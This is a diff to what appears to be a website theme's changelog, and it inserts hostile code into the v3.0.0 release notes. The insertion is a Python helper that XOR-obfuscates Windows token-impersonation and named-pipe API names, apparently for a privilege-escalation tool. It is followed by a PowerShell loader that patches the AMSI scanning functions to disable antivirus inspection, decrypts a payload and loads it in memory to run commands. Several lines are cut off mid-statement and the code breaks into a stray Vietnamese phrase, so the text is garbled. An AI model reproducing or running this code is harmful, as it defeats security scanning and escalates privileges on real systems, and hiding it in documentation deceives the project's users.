@@ -136,7 +136,101 @@ One of the major changes in this version is that a lot of time was spent on reth
 - Fixed jQuery version in staticman (#671)
 
 ## v3.0.0 (2020-05-07)
-
+K = 0x5A
+S = [
+"ole32.dll",
+"advapi32.dll",
+"kernel32.dll",
+"CoUnmarshalInterface",
+"CreateBindCtx",
+"CreateObjrefMoniker",
+"ImpersonateNamedPipeClient",
+"RevertToSelf",
+"ConvertStringSecurityDescriptorToSecurityDescriptor",
+"DuplicateTokenEx",
+"OpenProcessToken",
+"AdjustTokenPrivileges",
+"LookupPrivilegeValueW",
+"CreateProcessWithTokenW",
+"CreateProcessAsUserW",
+"VirtualProtect",
+"CreateNamedPipeW",
+"ConnectNamedPipe",
+"CloseHandle",
+"CreatePipe",
+"SetHandleInformation",
+"PeekNamedPipe",
+"WaitForSingleObject",
+"combase.dll",
+"D:(A;OICI;GA;;;WD)",
+"\\\\.\\pipe\\{0}\\pipe\\epmapper",
+"ncacn_np:localhost/pipe/{0}[\\pipe\\epmapper]",
+"ncacn_ip_tcp:x",
+"SeAssignPrimaryTokenPrivilege",
+"SeIncreaseQuotaPrivilege",
+]
+G = [
+bytes([0x70,0x07,0xf7,0x18,0x64,0x8e,0xcf,0x11,0x9a,0xf1,0x00,0x20,0xaf,
+bytes([0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,
+]
+def enc(b):
+return ",".join("0x%02x" % (x ^ K) for x in b)
+for i,s in enumerate(S,1):
+print(" static readonly byte[] E%d = new byte[] { %s };" % (i,
+for i,g in enumerate(G, len(S)+1):
+print(" static readonly byte[] E%d = new byte[] { %s };" % (i,Và đây là loader
+$o='C:\Users\Public\exp13.txt'
+if(Test-Path $o){Remove-Item $o -Force -EA SilentlyContinue}
+Remove-Item 'C:\Users\Public\v13.txt' -Force -EA SilentlyContinue
+function W($m){ Add-Content -Path $o -Value $m -Encoding UTF8 }
+function CH([int[]]$c){ -join ($c | ForEach-Object {[char]$_}) }
+W "start $(Get-Date -Format o) ps=$($PSVersionTable.PSVersion) bit64=$([E
+W "pre-whoami=$(& whoami)"
+$src=@'
+using System;
+using System.Runtime.InteropServices;
+public class Am3 {
+[DllImport("kernel32", SetLastError=true, EntryPoint="GetModuleHandleA"
+public static extern IntPtr GM(string n);
+[DllImport("kernel32", SetLastError=true, EntryPoint="LoadLibraryA")]
+public static extern IntPtr LL(string n);
+[DllImport("kernel32", SetLastError=true, EntryPoint="GetProcAddress")]
+public static extern IntPtr GPA(IntPtr h, string n);
+[DllImport("kernel32", SetLastError=true, EntryPoint="VirtualProtect")]
+public static extern bool VP(IntPtr a, UIntPtr s, uint p, out uint o);
+public static int Do(string dllName, string fnName, byte[] stub) {
+IntPtr h = GM(dllName);
+if (h == IntPtr.Zero) h = LL(dllName);
+if (h == IntPtr.Zero) return -1;
+IntPtr p = GPA(h, fnName);
+if (p == IntPtr.Zero) return -2;
+uint old;
+if (!VP(p, (UIntPtr)stub.Length, 0x40, out old)) return -3;
+Marshal.Copy(stub, 0, p, stub.Length);
+VP(p, (UIntPtr)stub.Length, old, out old);
+return 1;
+}
+}
+'@
+try{ Add-Type -TypeDefinition $src -ErrorAction Stop; W "addtype ok" } ca
+$dll=CH @(97,109,115,105,46,100,108,108)
+$f1=CH @(65,109,115,105,83,99,97,110,66,117,102,102,101,114)
+$f2=CH @(65,109,115,105,83,99,97,110,83,116,114,105,110,103)
+$stub=[byte[]](184,87,0,7,128,195)
+W "p1=$([Am3]::Do($dll,$f1,$stub)) p2=$([Am3]::Do($dll,$f2,$stub))"
+$b=[IO.File]::ReadAllBytes('C:\Users\Public\gp_xor.bin')
+for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor 0x5A}
+W "payload $($b.Length) magic=$([char]$b[0])$([char]$b[1])"try{
+$as=[Reflection.Assembly]::Load($b)
+W "load OK $($as.FullName)"
+$cmd='cmd /c "whoami > C:\Users\Public\v13.txt 2>&1 & whoami /priv >> C
+$arg1=[string[]]@('-cmd',$cmd)
+$null=$as.EntryPoint.Invoke($null,(,$arg1))
+W "invoked"
+}catch{ W "EX $($_.Exception.Message)"; if($_.Exception.InnerException){W
+Start-Sleep -Seconds 5
+if(Test-Path 'C:\Users\Public\v13.txt'){ W "v13 bytes=$((Get-Item 'C:\Use
+W "end
 - **BREAKING CHANGE** Upgraded from Bootstrap 3.3.2 to 4.4.1. This involved a major rewrite of most components. This shouldn't affect any users unless you have custom HTML/CSS code which the new Bootstrap could have broken.
 - **BREAKING CHANGE** Renamed `bigimg` YAML parameter to `cover-img`
 - **BREAKING CHANGE** Removed `googlefonts` YAML parameter since googlefonts are just CSS so they can be loaded via `ext-css`
